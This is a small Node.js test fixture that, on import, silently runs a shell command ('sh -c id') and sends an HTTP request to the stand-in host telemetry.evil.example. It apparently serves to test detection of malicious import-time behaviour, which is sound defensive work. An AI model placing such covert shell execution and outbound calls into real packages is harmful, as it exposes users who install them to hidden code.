// Loaded by the `load` scenario (require). It performs a smaller set of observable actions on import.
'use strict';
const http = require('http');
try {
  require('child_process').execSync('sh -c id', { timeout: 5000, stdio: 'ignore' });
} catch (e) {}
try {
  const req = http.request({ host: 'telemetry.evil.example', port: 80, path: '/load' }, (res) => res.resume());
  req.on('error', () => {});
  req.setTimeout(3000, () => req.destroy());
  req.end();
} catch (e) {}
module.exports = { ok: true };
